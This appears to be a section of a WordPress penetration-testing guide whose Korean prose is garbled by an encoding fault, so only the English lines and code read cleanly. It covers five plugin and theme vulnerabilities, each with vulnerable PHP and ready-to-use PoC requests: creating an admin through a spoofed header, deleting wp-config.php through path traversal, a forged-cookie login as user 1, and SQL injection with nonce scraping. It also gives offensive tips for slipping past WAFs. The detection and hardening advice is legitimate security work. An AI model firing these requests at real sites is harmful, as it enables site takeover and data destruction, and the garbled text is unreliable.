ë¬¼ë¡ , WordpressëŠ” PHPë¥¼ ì‚¬ìš©í•˜ê³  í”ŒëŸ¬ê·¸ì¸ ë‚´ë¶€ì˜ íŒŒì¼ì€ ì›¹ì—ì„œ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í”ŒëŸ¬ê·¸ì¸ì´ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ íŠ¸ë¦¬ê±°ë˜ëŠ” ì·¨ì•½í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ê³  ìˆë‹¤ë©´, ì–´ë–¤ ì‚¬ìš©ìë¼ë„ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ë‚´ë¶€ í†µí•©ì´ë‚˜ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œë¥¼ ìœ„í•´ "trusted header" ë‹¨ì¶•ì„ êµ¬í˜„í•œ ë‹¤ìŒ, ê·¸ í—¤ë”ë¥¼ ì‚¬ìš©í•´ REST ìš”ì²­ì˜ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. í•´ë‹¹ í—¤ë”ê°€ ìƒìœ„ ì»´í¬ë„ŒíŠ¸ì— ì˜í•´ ì•”í˜¸í•™ì ìœ¼ë¡œ ìš”ì²­ì— ë°”ì¸ë”©ë˜ì–´ ìˆì§€ ì•Šë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì´ í•„ìš”í•œ REST ê²½ë¡œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì˜í–¥: core users REST routeë¥¼ í†µí•´ ìƒˆ ê´€ë¦¬ì ê³„ì •ì„ ìƒì„±í•˜ì—¬ ì¸ì¦ ì—†ì´ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (ì‚¬ìš©ì ID 1ì„ ê°•ì œë¡œ ì„¤ì • â€” ì¼ë°˜ì ìœ¼ë¡œ ì²« ë²ˆì§¸ ê´€ë¦¬ì ê³„ì •).
- Exploited route: `POST /wp-json/wp/v2/users`ì— ìƒìŠ¹ëœ ì—­í•  ë°°ì—´ì„ í¬í•¨í•˜ì—¬ í˜¸ì¶œ.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ì™œ ì‘ë™í•˜ëŠ”ê°€

- í”ŒëŸ¬ê·¸ì¸ì´ í´ë¼ì´ì–¸íŠ¸ ì œì–´ í—¤ë”ë¥¼ ì¸ì¦ ìƒíƒœë¡œ ë§¤í•‘í•˜ê³  ê¶Œí•œ ê²€ì‚¬ë¥¼ ê±´ë„ˆë›´ë‹¤.
- WordPress coreëŠ” ì´ ê²½ë¡œì— ëŒ€í•´ `create_users` capabilityë¥¼ ê¸°ëŒ€í•œë‹¤; í”ŒëŸ¬ê·¸ì¸ í•´í‚¹ì€ í—¤ë”ì—ì„œ ì§ì ‘ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ì—¬ ì´ë¥¼ ìš°íšŒí•œë‹¤.

ì˜ˆìƒ ì„±ê³µ ì§€í‘œ

- ìƒì„±ëœ ì‚¬ìš©ìë¥¼ ì„¤ëª…í•˜ëŠ” JSON ë³¸ë¬¸ê³¼ í•¨ê»˜ HTTP 201.
- `wp-admin/users.php`ì—ì„œ í™•ì¸ ê°€ëŠ¥í•œ ìƒˆë¡œìš´ ê´€ë¦¬ì ì‚¬ìš©ì.

íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

- `getallheaders()`, `$_SERVER['HTTP_...']` ë˜ëŠ” ì‚¬ìš©ì ì§€ì • í—¤ë”ë¥¼ ì½ì–´ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ëŠ” vendor SDK(ì˜ˆ: `wp_set_current_user()`, `wp_set_auth_cookie()`)ë¥¼ grep í•˜ë¼.
- ìš”ì²­ í—¤ë”ì— ì˜ì¡´í•˜ê³  ê°•ë ¥í•œ `permission_callback` ì²´í¬ê°€ ì—†ëŠ” íŠ¹ê¶Œ ì½œë°±ì— ëŒ€í•´ REST ë“±ë¡ì„ ê²€í† í•˜ë¼.
- REST í•¸ë“¤ëŸ¬ ë‚´ì—ì„œ í—¤ë” ê°’ìœ¼ë¡œë§Œ ê²Œì´íŒ…ëœ ìƒíƒœë¡œ ì‚¬ìš©ë˜ëŠ” ì½”ì–´ ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜(`wp_insert_user`, `wp_create_user`)ì˜ ì‚¬ìš©ì„ ì°¾ì•„ë¼.

ë³´ì•ˆ ê°•í™”

- í´ë¼ì´ì–¸íŠ¸ ì œì–´ í—¤ë”ì—ì„œ ì¸ì¦ì´ë‚˜ ê¶Œí•œì„ ì ˆëŒ€ ìœ ë„í•˜ì§€ ë§ˆë¼.
- ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œê°€ ì‹ ì›ì„ ì£¼ì…í•´ì•¼ í•œë‹¤ë©´, í”„ë¡ì‹œì—ì„œ ì‹ ë¢°ë¥¼ ì¢…ë£Œí•˜ê³  ìˆ˜ì‹  í—¤ë” ì‚¬ë³¸ì„ ì œê±°(ì˜ˆ: ì—ì§€ì—ì„œ `unset X-Wcpay-Platform-Checkout-User`)í•œ ë‹¤ìŒ ì„œëª…ëœ í† í°ì„ ì „ë‹¬í•˜ê³  ì„œë²„ ì¸¡ì—ì„œ ê²€ì¦í•˜ë¼.
- íŠ¹ê¶Œ ë™ì‘ì„ ìˆ˜í–‰í•˜ëŠ” REST ê²½ë¡œì—ëŠ” `current_user_can()` ì²´í¬ì™€ ì—„ê²©í•œ `permission_callback`ì„ ìš”êµ¬í•˜ë¼(ì ˆëŒ€ `__return_true`ë¥¼ ì‚¬ìš©í•˜ì§€ ë§ˆë¼).
- í—¤ë” â€œimpersonationâ€ ëŒ€ì‹  ì¿ í‚¤, application passwords, OAuth ê°™ì€ 1ì°¨ ì¸ì¦ì„ ì„ í˜¸í•˜ë¼.

ì°¸ê³ : ê³µê°œ ì‚¬ë¡€ì™€ ë” ë„“ì€ ë¶„ì„ì€ ì´ í˜ì´ì§€ ëì˜ ë§í¬ë¥¼ ì°¸ì¡°í•˜ë¼.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress í…Œë§ˆì™€ í”ŒëŸ¬ê·¸ì¸ì€ ì¢…ì¢… `wp_ajax_` ë° `wp_ajax_nopriv_` í›…ì„ í†µí•´ AJAX í•¸ë“¤ëŸ¬ë¥¼ ë…¸ì¶œí•œë‹¤. **_nopriv_** ë³€í˜•ì´ ì‚¬ìš©ë˜ë©´ **ì½œë°±ì´ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìë„ ì ‘ê·¼ ê°€ëŠ¥í•˜ê²Œ ë˜ë¯€ë¡œ**, ë¯¼ê°í•œ ë™ì‘ì€ ì¶”ê°€ë¡œ ë‹¤ìŒì„ êµ¬í˜„í•´ì•¼ í•œë‹¤:

1. **ê¶Œí•œ ê²€ì‚¬** (ì˜ˆ: `current_user_can()` ë˜ëŠ” ìµœì†Œ `is_user_logged_in()`), ê·¸ë¦¬ê³ 
2. `check_ajax_referer()` / `wp_verify_nonce()`ë¡œ ê²€ì¦ëœ **CSRF nonce**, ê·¸ë¦¬ê³ 
3. **ì—„ê²©í•œ ì…ë ¥ ì •ì œ / ê²€ì¦**.

Litho multipurpose theme (< 3.1)ëŠ” *Remove Font Family* ê¸°ëŠ¥ì—ì„œ ì´ ì„¸ ê°€ì§€ ì œì–´ë¥¼ ë†“ì³ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œ(ë‹¨ìˆœí™”ëœ)ë¥¼ ë°°í¬í•˜ê²Œ ë˜ì—ˆë‹¤:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ì´ ìŠ¤ë‹ˆí«ì´ ì•¼ê¸°í•˜ëŠ” ë¬¸ì œì :

* **ì¸ì¦ë˜ì§€ ì•Šì€ ì ‘ê·¼** â€“ `wp_ajax_nopriv_` í›…ì´ ë“±ë¡ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
* **nonce / capability í™•ì¸ ì—†ìŒ** â€“ ì–´ë–¤ ë°©ë¬¸ìë„ í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ê²½ë¡œ ì •ì œ ì—†ìŒ** â€“ ì‚¬ìš©ì ì œì–´ `fontfamily` ë¬¸ìì—´ì´ í•„í„°ë§ ì—†ì´ íŒŒì¼ì‹œìŠ¤í…œ ê²½ë¡œì— ì´ì–´ë¶™ì—¬ì ¸ ì „í˜•ì ì¸ `../../` íŠ¸ë˜ë²„ì„¤ì„ í—ˆìš©í•©ë‹ˆë‹¤.

#### ì•…ìš©

ê³µê²©ìëŠ” ë‹¨ì¼ HTTP POST ìš”ì²­ì„ ì „ì†¡í•˜ì—¬ **uploads ê¸°ë³¸ ë””ë ‰í„°ë¦¬ ì•„ë˜** (ë³´í†µ `<wp-root>/wp-content/uploads/`)ì˜ ëª¨ë“  íŒŒì¼ì´ë‚˜ ë””ë ‰í„°ë¦¬ë¥¼ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

* íŒŒì¼ì‹œìŠ¤í…œ í—¬í¼(`copy()`, `unlink()`, `$wp_filesystem->delete()` ë“±)ë¥¼ í˜¸ì¶œí•˜ëŠ” ëª¨ë“  `add_action( 'wp_ajax_nopriv_...')` ì½œë°±.
* ì •ì œë˜ì§€ ì•Šì€ ì‚¬ìš©ì ì…ë ¥ì„ ê²½ë¡œì— ì—°ê²°í•˜ëŠ” ê²½ìš°( `$_POST`, `$_GET`, `$_REQUEST`ë¥¼ í™•ì¸).
* `check_ajax_referer()` ë° `current_user_can()`/`is_user_logged_in()` í˜¸ì¶œì˜ ë¶€ì¬.

#### í•˜ë“œë‹
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** ë””ìŠ¤í¬ì— ëŒ€í•œ ëª¨ë“  ì“°ê¸°/ì‚­ì œ ì‘ì—…ì€ ê¶Œí•œì´ í•„ìš”í•œ ê²ƒìœ¼ë¡œ ì·¨ê¸‰í•˜ê³  ë‹¤ìŒì„ ì¬í™•ì¸í•˜ì„¸ìš”:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

ë§ì€ í”ŒëŸ¬ê·¸ì¸ë“¤ì€ ì›ë˜ì˜ ì—­í• ì„ user metaì— ì €ì¥í•´ ë‚˜ì¤‘ì— ë³µì›í•  ìˆ˜ ìˆë„ë¡ "view as role" ë˜ëŠ” ì„ì‹œ ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ êµ¬í˜„í•©ë‹ˆë‹¤. ë³µì› ê²½ë¡œê°€ ìš”ì²­ íŒŒë¼ë¯¸í„°(ì˜ˆ: `$_REQUEST['reset-for']`)ì™€ í”ŒëŸ¬ê·¸ì¸ì´ ê´€ë¦¬í•˜ëŠ” ëª©ë¡ì—ë§Œ ì˜ì¡´í•˜ê³  capabilities í™•ì¸ì´ë‚˜ ìœ íš¨í•œ nonce ê²€ì¦ì„ í•˜ì§€ ì•Šìœ¼ë©´, ì´ëŠ” vertical privilege escalationì´ ë©ë‹ˆë‹¤.

ì‹¤ì œ ì‚¬ë¡€ëŠ” Admin and Site Enhancements (ASE) í”ŒëŸ¬ê·¸ì¸ (â‰¤ 7.6.2.1)ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. reset ë¶„ê¸°ëŠ” ë‚´ë¶€ ë°°ì—´ `$options['viewing_admin_as_role_are']`ì— ì‚¬ìš©ì ì´ë¦„ì´ ìˆì„ ê²½ìš° `reset-for=<username>`ì— ë”°ë¼ ì—­í• ì„ ë³µì›í–ˆì§€ë§Œ, í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  user meta `_asenha_view_admin_as_original_roles`ì— ì €ì¥ëœ ì—­í• ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ê¸° ì „ì— `current_user_can()` ì²´í¬ë‚˜ nonce ê²€ì¦ì„ ìˆ˜í–‰í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ì™œ ì·¨ì•½í•œê°€

- ì„œë²„ ì¸¡ ê¶Œí•œ í™•ì¸ ì—†ì´ `$_REQUEST['reset-for']`ì™€ í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ì„ ì‹ ë¢°í•¨.
- ì‚¬ìš©ìê°€ ì´ì „ì— `_asenha_view_admin_as_original_roles`ì— ë†’ì€ ê¶Œí•œì´ ì €ì¥ë˜ì–´ ìˆì—ˆê³  ê¶Œí•œì´ ê°•ë“±ëœ ê²½ìš°, reset ê²½ë¡œë¥¼ í˜¸ì¶œí•´ í•´ë‹¹ ê¶Œí•œì„ ë³µì›í•  ìˆ˜ ìˆìŒ.
- ì¼ë¶€ ë°°í¬ í™˜ê²½ì—ì„œëŠ” ì¸ì¦ëœ ì–´ë–¤ ì‚¬ìš©ìë“  `viewing_admin_as_role_are`ì— ì—¬ì „íˆ ë‚¨ì•„ìˆëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìëª…ì— ëŒ€í•´ resetì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŒ(ê¶Œí•œ ê²€ì¦ ëˆ„ë½).

Attack prerequisites

- í•´ë‹¹ ê¸°ëŠ¥ì´ í™œì„±í™”ëœ ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ë²„ì „.
- ëŒ€ìƒ ê³„ì •ì˜ user metaì— ì´ì „ì— ì €ì¥ëœ ì˜¤ë˜ëœ ê³ ê¶Œí•œ ì—­í• ì´ ìˆìŒ.
- ì¸ì¦ëœ ì•„ë¬´ ì„¸ì…˜; reset íë¦„ì— nonce/capabilityê°€ ëˆ„ë½ë¨.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ì·¨ì•½í•œ ë¹Œë“œì—ì„œëŠ” ì´ê²ƒì´ í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  ì €ì¥ëœ ì›ë˜ ì—­í• (ì˜ˆ: `administrator`)ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ì—¬ ì‹¤ì§ˆì ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.

Detection checklist

- ì‚¬ìš©ì ë©”íƒ€ì— â€œoriginal rolesâ€ë¥¼ ì €ì¥í•˜ëŠ” ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ ì°¾ì•„ë³´ì„¸ìš” (ì˜ˆ: `_asenha_view_admin_as_original_roles`).
- ë‹¤ìŒê³¼ ê°™ì€ reset/restore ê²½ë¡œë¥¼ ì‹ë³„í•˜ì„¸ìš”:
- ì‚¬ìš©ì ì´ë¦„ì„ `$_REQUEST` / `$_GET` / `$_POST`ì—ì„œ ì½ëŠ” ê²½ìš°.
- `add_role()` / `remove_role()`ë¡œ ì—­í• ì„ ìˆ˜ì •í•˜ë©´ì„œ `current_user_can()` ë° `wp_verify_nonce()` / `check_admin_referer()`ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°.
- í–‰ìœ„ìì˜ ê¶Œí•œ ëŒ€ì‹  í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ ë°°ì—´(ì˜ˆ: `viewing_admin_as_role_are`)ì— ê¸°ë°˜í•´ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ê²½ìš°.

Hardening

- ëª¨ë“  ìƒíƒœ ë³€ê²½ ë¶„ê¸°ë§ˆë‹¤ ê¶Œí•œ ì²´í¬ë¥¼ ì ìš©í•˜ì„¸ìš” (ì˜ˆ: `current_user_can('manage_options')` ë˜ëŠ” ë” ì—„ê²©í•œ ì¡°ê±´).
- ëª¨ë“  ì—­í• /ê¶Œí•œ ë³€ê²½ì— ëŒ€í•´ noncesë¥¼ ìš”êµ¬í•˜ê³  ê²€ì¦í•˜ì„¸ìš”: `check_admin_referer()` / `wp_verify_nonce()`.
- ìš”ì²­ìœ¼ë¡œ ì „ë‹¬ëœ ì‚¬ìš©ì ì´ë¦„ì„ ì ˆëŒ€ ì‹ ë¢°í•˜ì§€ ë§ˆì„¸ìš”; ì¸ì¦ëœ í–‰ìœ„ìì™€ ëª…í™•í•œ ì •ì±…ì— ê¸°ë°˜í•´ ì„œë²„ ì¸¡ì—ì„œ ëŒ€ìƒ ì‚¬ìš©ìë¥¼ ê²°ì •í•˜ì„¸ìš”.
- í”„ë¡œí•„/ì—­í•  ì—…ë°ì´íŠ¸ ì‹œ â€œoriginal rolesâ€ ìƒíƒœë¥¼ ë¬´íš¨í™”í•˜ì—¬ ì˜¤ë˜ëœ ë†’ì€ ê¶Œí•œ ë³µì›ì´ ë°œìƒí•˜ì§€ ì•Šë„ë¡ í•˜ì„¸ìš”:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- ì„ì‹œ ì—­í•  ì „í™˜ì„ ìœ„í•´ ìƒíƒœë¥¼ ìµœì†Œí™”í•˜ì—¬ ì €ì¥í•˜ê³ , ì‹œê°„ ì œí•œì´ ìˆëŠ” capability-guarded tokensë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ê³ ë ¤í•˜ì„¸ìš”.

---

### ì¸ì¦ë˜ì§€ ì•Šì€ ê¶Œí•œ ìƒìŠ¹ via cookieâ€‘trusted user switching on public `init` (Service Finder â€œsf-bookingâ€)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ user-switching í—¬í¼ë¥¼ public `init` í›…ì— ì—°ê²°í•˜ê³ , í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” cookieë¡œë¶€í„° ì•„ì´ë´í‹°í‹°ë¥¼ ìœ ë„í•©ë‹ˆë‹¤. ì½”ë“œê°€ ì¸ì¦, capability, ìœ íš¨í•œ nonceë¥¼ ê²€ì¦í•˜ì§€ ì•Šê³  `wp_set_auth_cookie()`ë¥¼ í˜¸ì¶œí•˜ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìë„ ì„ì˜ì˜ ì‚¬ìš©ì IDë¡œ ê°•ì œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì „í˜•ì ì¸ ì·¨ì•½ íŒ¨í„´ (ë‹¨ìˆœí™”í•œ Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Why itâ€™s exploitable

- ê³µê°œëœ `init` í›…ìœ¼ë¡œ ì¸í•´ í•¸ë“¤ëŸ¬ê°€ unauthenticated ì‚¬ìš©ìì—ê²Œ ì ‘ê·¼ ê°€ëŠ¥í•¨ (`is_user_logged_in()` ê°€ë“œ ì—†ìŒ).
- IdentityëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ ìˆ˜ì • ê°€ëŠ¥í•œ ì¿ í‚¤(`original_user_id`)ì—ì„œ ìœ ë˜í•¨.
- `wp_set_auth_cookie($uid)`ë¥¼ ì§ì ‘ í˜¸ì¶œí•˜ë©´ ìš”ì²­ìë¥¼ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ì‹œí‚´ â€” ì–´ë–¤ capability/nonce ê²€ì‚¬ë„ ì—†ì´.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WordPress/í”ŒëŸ¬ê·¸ì¸ CVEì— ëŒ€í•œ WAF ê³ ë ¤ì‚¬í•­

ì¼ë°˜ì ì¸ edge/server WAFëŠ” ê´‘ë²”ìœ„í•œ íŒ¨í„´(SQLi, XSS, LFI)ì— ë§ì¶° ì¡°ì •ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë§ì€ ê³ ìœ„í—˜ WordPress/í”ŒëŸ¬ê·¸ì¸ ê²°í•¨ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ íŠ¹í™” ë¡œì§/ì¸ì¦ ë²„ê·¸ë¡œ, ì—”ì§„ì´ WordPress ê²½ë¡œì™€ í”ŒëŸ¬ê·¸ì¸ ì˜ë¯¸ë¡ ì„ ì´í•´í•˜ì§€ ëª»í•˜ë©´ ì •ìƒ íŠ¸ë˜í”½ì²˜ëŸ¼ ë³´ì…ë‹ˆë‹¤.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress ë³´í˜¸

### ì •ê¸° ì—…ë°ì´íŠ¸

WordPress, plugins, ê·¸ë¦¬ê³  themesê°€ ìµœì‹  ìƒíƒœì¸ì§€ í™•ì¸í•˜ì„¸ìš”. ë˜í•œ wp-config.phpì—ì„œ ìë™ ì—…ë°ì´íŠ¸ê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ë˜í•œ, **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” WordPress í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë§Œ ì„¤ì¹˜í•˜ì„¸ìš”**.

### ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ê¸°íƒ€ ê¶Œì¥ì‚¬í•­**

- ê¸°ë³¸ **admin** ì‚¬ìš©ì ì œê±°
- ê°•ë ¥í•œ **ë¹„ë°€ë²ˆí˜¸**ì™€ **2FA** ì‚¬ìš©
- ì •ê¸°ì ìœ¼ë¡œ ì‚¬ìš©ì **ê¶Œí•œ**ì„ **ê²€í† **
- **ë¡œê·¸ì¸ ì‹œë„ ì œí•œ**ìœ¼ë¡œ Brute Force ê³µê²© ë°©ì§€
- **`wp-admin.php`** íŒŒì¼ ì´ë¦„ì„ ë³€ê²½í•˜ê³  ë‚´ë¶€ì—ì„œë‚˜ íŠ¹ì • IP ì£¼ì†Œì—ì„œë§Œ ì ‘ê·¼ì„ í—ˆìš©í•˜ì„¸ìš”.


### ê²€ì¦ ë¶€ì¡±ìœ¼ë¡œ ì¸í•œ Unauthenticated SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal ì±„ìš© í”ŒëŸ¬ê·¸ì¸ì€ **savecategory** ì‘ì—…ì„ ë…¸ì¶œí–ˆìœ¼ë©°, ìµœì¢…ì ìœ¼ë¡œ `modules/category/model.php::validateFormData()` ë‚´ë¶€ì—ì„œ ë‹¤ìŒ ì·¨ì•½í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ì´ ìŠ¤ë‹ˆí«ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ë¬¸ì œ:

1. **Unsanitised user input** â€“ `parentid`ê°€ HTTP ìš”ì²­ì—ì„œ ê·¸ëŒ€ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / prepared statementê°€ ì‚¬ìš©ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.
3. **Unauthenticated reachability** â€“ í•´ë‹¹ actionì€ `admin-post.php`ë¥¼ í†µí•´ ì‹¤í–‰ë˜ì§€ë§Œ, ìœ ì¼í•œ ê²€ì¦ì€ **CSRF nonce** (`wp_verify_nonce()`)ë¿ì´ë©°, ì´ nonceëŠ” `[wpjobportal_my_resumes]` ìˆì½”ë“œë¥¼ í¬í•¨í•œ ê³µê°œ í˜ì´ì§€ì—ì„œ ëˆ„êµ¬ë‚˜ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ì•…ìš©

1. ìƒˆë¡œìš´ nonce íšë“:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`ë¥¼ ì•…ìš©í•´ ì„ì˜ì˜ SQLì„ ì£¼ì…:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
